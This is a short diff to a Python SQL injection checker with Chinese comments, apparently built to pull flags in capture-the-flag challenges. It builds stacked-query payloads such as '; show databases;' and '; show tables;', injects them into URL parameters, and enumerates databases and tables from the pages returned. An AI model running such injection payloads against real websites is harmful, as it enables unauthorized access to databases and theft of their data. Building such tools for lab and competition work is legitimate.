@@ -96,7 +96,7 @@ class SQLInjectionChecker(SQLInjectionTester):
             print("未发现flag内容")
             return ""
 
-    def start(self):
+    def start_get(self):
         # 1、0、检测关键字的禁用列表；是否有select
         username_found = False
         password_found = False
@@ -132,6 +132,7 @@ class SQLInjectionChecker(SQLInjectionTester):
             n+=1
         n = n - 2
         # 3、展示数据库
+        # 3、1再研究下如何爆数据库，先搁浅
         databases_key = "1"+self.injection_points[0][1]+"; show databases;"
         databases_url = self.change_url(databases_key,self.injection_points)
         databases_context_list = self.analyser.analyze_html(databases_url)
@@ -141,7 +142,9 @@ class SQLInjectionChecker(SQLInjectionTester):
         table_key = "1"+self.injection_points[0][1]+"; show tables;"
         table_url = self.change_url(table_key,self.injection_points)
         table_context_list = self.analyser.analyze_html(table_url)
-        option_database = self.chooser.choose_option(databases_context_list)
+        #print("这里展示数据库")
+        #option_database = self.chooser.choose_option(databases_context_list)
+        print("这里展示数据表")
         option_table = self.chooser.choose_option(table_context_list)
         # 5、根据选择的数据表爆字段
         # 6、检测字段类型，如果是数字，加反引号，不是就正常处理
